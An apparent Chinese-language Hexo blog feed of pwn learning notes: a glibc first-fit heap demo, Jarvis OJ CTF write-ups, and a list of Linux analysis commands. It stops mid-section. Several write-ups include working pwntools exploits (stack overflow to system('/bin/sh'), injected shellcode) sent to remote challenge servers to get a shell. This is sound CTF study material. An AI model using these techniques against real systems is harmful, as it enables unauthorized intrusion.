<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>xfgg</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2019-08-02T03:40:00.851Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>xfgg</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>first_fit</title>
    <link href="http://yoursite.com/2019/08/02/first_fit.c/"/>
    <id>http://yoursite.com/2019/08/02/first_fit.c/</id>
    <published>2019-08-01T23:36:00.555Z</published>
    <updated>2019-08-02T03:40:00.851Z</updated>
    
    <content type="html"><![CDATA[<p>堆的系统学习</p><h3 id="first-fit"><a href="#first-fit" class="headerlink" title="first_fit"></a>first_fit</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">fprintf(stderr, <span class="string">"This file doesn't demonstrate an attack, but shows the nature of glibc's allocator.\n"</span>);</span><br><span class="line">fprintf(stderr, <span class="string">"glibc uses a first-fit algorithm to select a free chunk.\n"</span>);</span><br><span class="line">fprintf(stderr, <span class="string">"If a chunk is free and large enough, malloc will select this chunk.\n"</span>);</span><br><span class="line">fprintf(stderr, <span class="string">"This can be exploited in a use-after-free situation.\n"</span>);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, <span class="string">"Allocating 2 buffers. They can be large, don't have to be fastbin.\n"</span>);</span><br><span class="line">char* a = malloc(512);</span><br><span class="line">char* b = malloc(256);</span><br><span class="line">char* c;</span><br><span class="line"></span><br><span class="line">fprintf(stderr, <span class="string">"1st malloc(512): %p\n"</span>, a);</span><br><span class="line">fprintf(stderr, <span class="string">"2nd malloc(256): %p\n"</span>, b);</span><br><span class="line">fprintf(stderr, <span class="string">"we could continue mallocing here...\n"</span>);</span><br><span class="line">fprintf(stderr, <span class="string">"now let's put a string at a that we can read later \"this is A!\"\n"</span>);</span><br><span class="line">strcpy(a, <span class="string">"this is A!"</span>);</span><br><span class="line">fprintf(stderr, <span class="string">"first allocation %p points to %s\n"</span>, a, a);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, <span class="string">"Freeing the first one...\n"</span>);</span><br><span class="line">free(a);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, <span class="string">"We don't need to free anything again. As long as we allocate less than 512, it will end up at %p\n"</span>, a);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, <span class="string">"So, let's allocate 500 bytes\n"</span>);</span><br><span class="line">c = malloc(500);</span><br><span class="line">fprintf(stderr, <span class="string">"3rd malloc(500): %p\n"</span>, c);</span><br><span class="line">fprintf(stderr, <span class="string">"And put a different string here, \"this is C!\"\n"</span>);</span><br><span class="line">strcpy(c, <span class="string">"this is C!"</span>);</span><br><span class="line">fprintf(stderr, <span class="string">"3rd allocation %p points to %s\n"</span>, c, c);</span><br><span class="line">fprintf(stderr, <span class="string">"first allocation %p points to %s\n"</span>, a, a);</span><br><span class="line">fprintf(stderr, <span class="string">"If we reuse the first allocation, it now holds the data from the third allocation.\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">执行程序后的输出</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">This file doesn<span class="string">'t demonstrate an attack, but shows the nature of glibc'</span>s allocator.</span><br><span class="line">glibc uses a first-fit algorithm to select a free chunk.</span><br><span class="line">If a chunk is free and large enough, malloc will select this chunk.</span><br><span class="line">This can be exploited <span class="keyword">in</span> a use-after-free situation.</span><br><span class="line">Allocating  buffers. They can be large, don<span class="string">'t have to be fastbin.</span></span><br><span class="line"><span class="string">1st ): 0x245b420</span></span><br><span class="line"><span class="string">2nd ): 0x245b630</span></span><br><span class="line"><span class="string">we could continue mallocing here...</span></span><br><span class="line"><span class="string">now let'</span>s put a string at a that we can <span class="built_in">read</span> later <span class="string">"this is A!"</span></span><br><span class="line">first allocation 0x245b420 points to this is A!</span><br><span class="line">Freeing the first one...</span><br><span class="line">We don<span class="string">'t need to free anything again. As long as we allocate less than 512, it will end up at 0x245b420</span></span><br><span class="line"><span class="string">So, let'</span>s allocate 500 bytes</span><br><span class="line">3rd ): 0x245b420</span><br><span class="line">And put a different string here, <span class="string">"this is C!"</span></span><br><span class="line">3rd allocation 0x245b420 points to this is C!</span><br><span class="line">first allocation 0x245b420 points to this is C!</span><br><span class="line">If we reuse the first allocation, it now holds the data from the third allocation.</span><br><span class="line"></span><br><span class="line">这个案例只是讲了glibc分配chunk时的first fit原则,可以用于use after free漏洞,比较简单,对照看看源码和输出即可,</span><br><span class="line"></span><br><span class="line">我的理解是 free(a)之后a的指针空闲了出来 除非字节大于512 不然还是输出a的值 0x245b420，c字节为500，所以还是输出0x245b420</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;堆的系统学习&lt;/p&gt;
&lt;h3 id=&quot;first-fit&quot;&gt;&lt;a href=&quot;#first-fit&quot; class=&quot;headerlink&quot; title=&quot;first_fit&quot;&gt;&lt;/a&gt;first_fit&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;
      
    
    </summary>
    
      <category term="how2heap" scheme="http://yoursite.com/categories/how2heap/"/>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>level1</title>
    <link href="http://yoursite.com/2019/07/31/level2/"/>
    <id>http://yoursite.com/2019/07/31/level2/</id>
    <published>2019-07-31T11:23:08.360Z</published>
    <updated>2019-07-31T11:35:52.293Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-寻找漏洞"><a href="#0x01-寻找漏洞" class="headerlink" title="0x01 寻找漏洞"></a>0x01 寻找漏洞</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="0x02-思路分析"><a href="#0x02-思路分析" class="headerlink" title="0x02 思路分析"></a>0x02 思路分析</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./level2'</span>)</span><br><span class="line">sys_addr = elf.symbols[<span class="string">'system'</span>]</span><br><span class="line">sh_addr = elf.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span> * (0x88 + 0x4) + p32(sys_addr) + p32(0xdeadbeef) + p32(sh_addr)</span><br><span class="line">io = remote(<span class="string">'pwn2.jarvisoj.com'</span>, 9878)</span><br><span class="line">io.sendlineafter(<span class="string">"Input:\n"</span>, payload)</span><br><span class="line">io.interactive()</span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x01-寻找漏洞&quot;&gt;&lt;a href=&quot;#0x01-寻找漏洞&quot; class=&quot;headerlink&quot; title=&quot;0x01 寻找漏洞&quot;&gt;&lt;/a&gt;0x01 寻找漏洞&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td
      
    
    </summary>
    
      <category term="jarvis OJ" scheme="http://yoursite.com/categories/jarvis-OJ/"/>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>level1</title>
    <link href="http://yoursite.com/2019/07/31/level1/"/>
    <id>http://yoursite.com/2019/07/31/level1/</id>
    <published>2019-07-31T05:28:39.324Z</published>
    <updated>2019-07-31T06:02:14.100Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-寻找漏洞"><a href="#0x01-寻找漏洞" class="headerlink" title="0x01 寻找漏洞"></a>0x01 寻找漏洞</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">xfgg@ubuntu:~/Documents$ file level1.80eacdcd51aca92af7749d96efad7fb5 </span><br><span class="line">level1.80eacdcd51aca92af7749d96efad7fb5: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, <span class="keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=7d479bd8046d018bbb3829ab97f6196c0238b344, not stripped</span><br><span class="line">xfgg@ubuntu:~/Documents$ checksec level1.80eacdcd51aca92af7749d96efad7fb5</span><br><span class="line">[*] <span class="string">'/home/xfgg/Documents/level1.80eacdcd51aca92af7749d96efad7fb5'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br><span class="line">什么保护都没开！！！</span><br><span class="line"></span><br><span class="line">ida分析</span><br><span class="line"></span><br><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  vulnerable_function();</span><br><span class="line">  write(1, <span class="string">"Hello, World!\n"</span>, 0xEu);</span><br><span class="line">  <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ssize_t vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  char buf; // [esp+0h] [ebp-88h]</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"What's this:%p?\n"</span>, &amp;buf);</span><br><span class="line">  <span class="built_in">return</span> <span class="built_in">read</span>(0, &amp;buf, 0x100u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="0x02-思路分析"><a href="#0x02-思路分析" class="headerlink" title="0x02 思路分析"></a>0x02 思路分析</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">一开始以为是write函数无libc泄露</span><br><span class="line">发现没有system做不下去了 没开保护 写入shellcode</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import * </span><br><span class="line">p=remote(<span class="string">"pwn2.jarvisoj.com"</span>,<span class="string">"9877"</span>)</span><br><span class="line">shellcode_addr=p.recvuntil(<span class="string">'?'</span>,drop=True)</span><br><span class="line">shellcode_addr=int(shellcode_addr[12:],16)</span><br><span class="line">pad=0x88</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">payload=shellcode.ljust(pad,<span class="string">'A'</span>)+<span class="string">"BBBB"</span>+p32(shellcode_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive();</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x01-寻找漏洞&quot;&gt;&lt;a href=&quot;#0x01-寻找漏洞&quot; class=&quot;headerlink&quot; title=&quot;0x01 寻找漏洞&quot;&gt;&lt;/a&gt;0x01 寻找漏洞&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td
      
    
    </summary>
    
      <category term="jarvis OJ" scheme="http://yoursite.com/categories/jarvis-OJ/"/>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>tell me something</title>
    <link href="http://yoursite.com/2019/07/31/tell%20me%20someting/"/>
    <id>http://yoursite.com/2019/07/31/tell me someting/</id>
    <published>2019-07-31T04:55:23.157Z</published>
    <updated>2019-07-31T06:07:09.779Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-寻找漏洞"><a href="#0x01-寻找漏洞" class="headerlink" title="0x01 寻找漏洞"></a>0x01 寻找漏洞</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">xfgg@ubuntu:~/Downloads$ file guestbook.d3d5869bd6fb04dd35b29c67426c0f05 </span><br><span class="line">guestbook.d3d5869bd6fb04dd35b29c67426c0f05: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, <span class="keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=7429502fc855237f3f8eeceb262ddcf6b2c2854e, not stripped</span><br><span class="line"></span><br><span class="line">64位程序</span><br><span class="line"></span><br><span class="line">xfgg@ubuntu:~/Downloads$ checksec guestbook.d3d5869bd6fb04dd35b29c67426c0f05</span><br><span class="line">[*] <span class="string">'/home/xfgg/Downloads/guestbook.d3d5869bd6fb04dd35b29c67426c0f05'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line"></span><br><span class="line">只开启nx保护</span><br><span class="line"></span><br><span class="line">ida分析</span><br><span class="line"></span><br><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v4; // [rsp+0h] [rbp-88h]</span><br><span class="line"></span><br><span class="line">  write(1, <span class="string">"Input your message:\n"</span>, 0x14uLL);</span><br><span class="line">  <span class="built_in">read</span>(0, &amp;v4, 0x100uLL);</span><br><span class="line">  <span class="built_in">return</span> write(1, <span class="string">"I have received your message, Thank you!\n"</span>, 0x29uLL);</span><br><span class="line">&#125;</span><br><span class="line">有个<span class="built_in">read</span>栈溢出漏洞 </span><br><span class="line"></span><br><span class="line">int good_game()</span><br><span class="line">&#123;</span><br><span class="line">  FILE *v0; // rbx</span><br><span class="line">  int result; // eax</span><br><span class="line">  char buf; // [rsp+Fh] [rbp-9h]</span><br><span class="line"></span><br><span class="line">  v0 = fopen(<span class="string">"flag.txt"</span>, <span class="string">"r"</span>);</span><br><span class="line">  <span class="keyword">while</span> ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    result = fgetc(v0);</span><br><span class="line">    buf = result;</span><br><span class="line">    <span class="keyword">if</span> ( (_BYTE)result == -1 )</span><br><span class="line">      <span class="built_in">break</span>;</span><br><span class="line">    write(1, &amp;buf, 1uLL);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">有个fopenflag 就很简单了 溢出返回就可以了</span><br></pre></td></tr></table></figure><h3 id="0x02-思路分析"><a href="#0x02-思路分析" class="headerlink" title="0x02 思路分析"></a>0x02 思路分析</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">查看main函数的栈</span><br><span class="line">-0000000000000088                 db ? ; undefined</span><br><span class="line">-0000000000000087                 db ? ; undefined</span><br><span class="line">-0000000000000086                 db ? ; undefined</span><br><span class="line">-0000000000000085                 db ? ; undefined</span><br><span class="line">-0000000000000084                 db ? ; undefined</span><br><span class="line"></span><br><span class="line">0x88位就可以溢出</span><br><span class="line"></span><br><span class="line">查看good_game的地址</span><br><span class="line">.text:0000000000400620                 push    rbx</span><br><span class="line">.text:0000000000400621                 mov     esi, offset modes ; <span class="string">"r"</span></span><br><span class="line">.text:0000000000400626                 mov     edi, offset filename ; <span class="string">"flag.txt"</span></span><br><span class="line">.text:000000000040062B                 sub     rsp, 10h</span><br><span class="line">.text:000000000040062F                 call    _fopen</span><br><span class="line">.text:0000000000400634                 mov     rbx, rax</span><br><span class="line">.text:0000000000400637                 jmp     short loc_400654</span><br><span class="line"></span><br><span class="line">0x400620为sys_addr</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">学习使用zio库</span><br><span class="line"></span><br><span class="line">import zio</span><br><span class="line">payload = <span class="string">"A"</span> * 0x88 + <span class="string">"\x20\x06\x40\x00\x00\x00\x00\x00"</span></span><br><span class="line">p = zio.zio((<span class="string">"pwn.jarvisoj.com"</span>, 9876))</span><br><span class="line">p.write(payload)</span><br><span class="line">p.interact()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x01-寻找漏洞&quot;&gt;&lt;a href=&quot;#0x01-寻找漏洞&quot; class=&quot;headerlink&quot; title=&quot;0x01 寻找漏洞&quot;&gt;&lt;/a&gt;0x01 寻找漏洞&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td
      
    
    </summary>
    
      <category term="jarvis OJ" scheme="http://yoursite.com/categories/jarvis-OJ/"/>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>linux下pwn常用的命令</title>
    <link href="http://yoursite.com/2019/07/30/pwn%E5%B8%B8%E7%94%A8%E7%9A%84%E5%91%BD%E4%BB%A4/"/>
    <id>http://yoursite.com/2019/07/30/pwn常用的命令/</id>
    <published>2019-07-30T09:44:38.667Z</published>
    <updated>2019-07-30T10:25:43.213Z</updated>
    
    <content type="html"><![CDATA[<h3 id="查看文件"><a href="#查看文件" class="headerlink" title="查看文件"></a>查看文件</h3><p>持续更新的文章 因为一时半会总结不出来 用到多少写多少吧</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">这里用rop做例子</span><br><span class="line">查看文件 32位文件</span><br><span class="line">xfgg@ubuntu:~/Downloads$ file rop</span><br><span class="line">rop: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, <span class="keyword">for</span> GNU/Linux 2.6.24, BuildID[sha1]=a6c3ab368d8cd315e3bb2b970556ed0510bca094, not stripped</span><br><span class="line"></span><br><span class="line">查看文件保护机制</span><br><span class="line">xfgg@ubuntu:~/Downloads$ file rop</span><br><span class="line">rop: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, <span class="keyword">for</span> GNU/Linux 2.6.24, BuildID[sha1]=a6c3ab368d8cd315e3bb2b970556ed0510bca094, not stripped</span><br><span class="line"></span><br><span class="line">分析文件调用了哪些系统调用</span><br><span class="line">strace ./rop</span><br><span class="line">execve(<span class="string">"./rop"</span>, [<span class="string">"./rop"</span>], 0x7ffe697d85e0 /* 55 vars */) = -1 ENOENT (No such file or directory)</span><br><span class="line">fstat(2, &#123;st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...&#125;) = 0</span><br><span class="line">write(2, <span class="string">"strace: exec: No such file or di"</span>..., 40strace: <span class="built_in">exec</span>: No such file or directory</span><br><span class="line">) = 40</span><br><span class="line">getpid()                                = 2180</span><br><span class="line">exit_group(1)                           = ?</span><br><span class="line">+++ exited with 1 +++</span><br><span class="line"> 我这里出现问题，一直提示没有这个文件</span><br><span class="line">因为在64位系统上运行32位文件</span><br><span class="line">sudo apt-get install lib32stdc++6 即可</span><br><span class="line">重新来一次</span><br><span class="line"></span><br><span class="line">xfgg@ubuntu:~/Desktop$ strace ./rop</span><br><span class="line">execve(<span class="string">"./rop"</span>, [<span class="string">"./rop"</span>], 0x7fff2dbf80f0 /* 51 vars */) = 0</span><br><span class="line">strace: [ Process PID=2479 runs <span class="keyword">in</span> 32 bit mode. ]</span><br><span class="line">brk(NULL)                               = 0x8634000</span><br><span class="line">access(<span class="string">"/etc/ld.so.nohwcap"</span>, F_OK)      = -1 ENOENT (No such file or directory)</span><br><span class="line">mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xf7f58000</span><br><span class="line">access(<span class="string">"/etc/ld.so.preload"</span>, R_OK)      = -1 ENOENT (No such file or directory)</span><br><span class="line">openat(AT_FDCWD, <span class="string">"/etc/ld.so.cache"</span>, O_RDONLY|O_CLOEXEC) = 3</span><br><span class="line">fstat64(3, &#123;st_mode=S_IFREG|0644, st_size=80654, ...&#125;) = 0</span><br><span class="line">mmap2(NULL, 80654, PROT_READ, MAP_PRIVATE, 3, 0) = 0xf7f44000</span><br><span class="line">close(3)                                = 0</span><br><span class="line">access(<span class="string">"/etc/ld.so.nohwcap"</span>, F_OK)      = -1 ENOENT (No such file or directory)</span><br><span class="line">openat(AT_FDCWD, <span class="string">"/lib32/libc.so.6"</span>, O_RDONLY|O_CLOEXEC) = 3</span><br><span class="line"><span class="built_in">read</span>(3, <span class="string">"\177ELF\1\1\1\3\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\0\220\1\0004\0\0\0"</span>..., 512) = 512</span><br><span class="line">fstat64(3, &#123;st_mode=S_IFREG|0755, st_size=1926828, ...&#125;) = 0</span><br><span class="line">mmap2(NULL, 1935900, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xf7d6b000</span><br><span class="line">mprotect(0xf7f3d000, 4096, PROT_NONE)   = 0</span><br><span class="line">mmap2(0xf7f3e000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1d2000) = 0xf7f3e000</span><br><span class="line">mmap2(0xf7f41000, 10780, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xf7f41000</span><br><span class="line">close(3)                                = 0</span><br><span class="line">set_thread_area(&#123;entry_number=-1, base_addr=0xf7f590c0, <span class="built_in">limit</span>=0x0fffff, seg_32bit=1, contents=0, read_exec_only=0, limit_in_pages=1, seg_not_present=0, useable=1&#125;) = 0 (entry_number=12)</span><br><span class="line">mprotect(0xf7f3e000, 8192, PROT_READ)   = 0</span><br><span class="line">mprotect(0x8049000, 4096, PROT_READ)    = 0</span><br><span class="line">mprotect(0xf7f85000, 4096, PROT_READ)   = 0</span><br><span class="line">munmap(0xf7f44000, 80654)               = 0</span><br><span class="line">getegid32()                             = 1000</span><br><span class="line">setresgid32(1000, 1000, 1000)           = 0</span><br><span class="line"><span class="built_in">read</span>(0, </span><br><span class="line"><span class="string">"\n"</span>, 256)                      = 1</span><br><span class="line">write(1, <span class="string">"Hello, World\n"</span>, 13Hello, World</span><br><span class="line">)          = 13</span><br><span class="line">exit_group(13)                          = ?</span><br><span class="line">+++ exited with 13 +++</span><br><span class="line">成功了  我还看不太懂这个 慢慢研究了</span><br><span class="line"></span><br><span class="line">查看libc文件的位置和地址</span><br><span class="line">xfgg@ubuntu:~/Desktop$ ldd rop</span><br><span class="line">linux-gate.so.1 (0xf7fc1000)</span><br><span class="line">libc.so.6 =&gt; /lib32/libc.so.6 (0xf7dcf000)</span><br><span class="line">/lib/ld-linux.so.2 (0xf7fc3000)</span><br><span class="line"></span><br><span class="line">提升文件的权限</span><br><span class="line"></span><br><span class="line">xfgg@ubuntu:~/Desktop$ chmod 777 rop</span><br></pre></td></tr></table></figure><h3 id="gdb的运用"><a href="#gdb的运用" class="headerlink" title="gdb的运用"></a>gdb的运用</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 